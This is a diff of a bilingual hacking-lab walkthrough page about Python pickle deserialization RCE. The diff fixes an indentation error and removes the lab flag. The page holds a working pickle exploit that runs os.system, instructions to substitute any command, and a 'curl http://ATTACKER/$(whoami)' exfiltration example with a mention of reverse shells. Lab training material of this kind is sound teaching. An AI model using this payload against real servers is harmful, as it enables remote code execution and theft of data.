@@ -61,13 +61,13 @@ class Exploit(object):
     def __reduce__(self):
         return (os.system, ('id',))
 
-  payload = base64.b64encode(pkl.dumps(Exploit())).decode()
+payload = base64.b64encode(pkl.dumps(Exploit())).decode()
 print(payload)</pre>
     <ol start="3">
       <li>No llames tu script <code>pickle.py</code> (sombrea el modulo estandar). Usa por ejemplo <code>exploit_pickle.py</code> y ejecuta: <code>python3 exploit_pickle.py</code>.</li>
       <li>Envía el payload al formulario. El servidor ejecutará <code>os.system('id')</code>.</li>
       <li>Cambia <code>'id'</code> por cualquier comando: <code>'curl http://ATTACKER/$(whoami)'</code>, reverse shell, etc.</li>
-      <li>Cuando el payload alcanza primitivas de ejecución, el lab muestra la flag dedicada: <code>HL{d353r1411z4710n_rc3_5ucc355}</code>.</li>
+      <li>Cuando el payload alcanza primitivas de ejecución, el lab muestra la flag dedicada del laboratorio.</li>
       <li>Genera payload con <strong>ysoserial</strong> (Java) o scripts similares para otros lenguajes.</li>
     </ol>
     <h3>Herramientas</h3>
@@ -85,13 +85,13 @@ class Exploit(object):
     def __reduce__(self):
         return (os.system, ('id',))
 
-  payload = base64.b64encode(pkl.dumps(Exploit())).decode()
+payload = base64.b64encode(pkl.dumps(Exploit())).decode()
 print(payload)</pre>
     <ol start="3">
       <li>Do not name your script <code>pickle.py</code> (it shadows the stdlib module). Use <code>exploit_pickle.py</code> and run: <code>python3 exploit_pickle.py</code>.</li>
       <li>Submit the payload via the form. The server will execute <code>os.system('id')</code>.</li>
       <li>Replace <code>'id'</code> with any command: reverse shell, file read, etc.</li>
-      <li>When code execution primitives are reached, the lab displays the dedicated flag: <code>HL{d353r1411z4710n_rc3_5ucc355}</code>.</li>
+      <li>When code execution primitives are reached, the lab displays the dedicated flag.</li>
       <li>Generate payloads with <strong>ysoserial</strong> (Java) or similar tools for other languages.</li>
     </ol>
     <h3>Tools</h3>
